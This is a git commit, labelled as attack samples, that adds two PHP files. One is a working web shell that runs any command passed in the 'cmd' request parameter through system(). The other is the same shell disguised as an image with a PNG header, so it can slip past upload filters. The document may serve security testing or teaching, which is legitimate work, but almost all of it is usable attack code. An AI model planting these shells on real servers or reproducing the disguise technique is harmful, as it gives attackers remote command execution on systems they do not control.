6ed90ef9b28a500a8fdf33a327a4dfc1f0d755dc
Evandro Mohr <mohr.evandro@gmail.com>
2021-07-26 13:53:26 -0300

    Including some attacks samples

---
+++ app/ataques/shell.php
@@ -0,0 +1,10 @@
+<?php
+
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
---
+++ app/ataques/xx.php
@@ -0,0 +1,12 @@
+‰PNG
+
+<?php
+
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
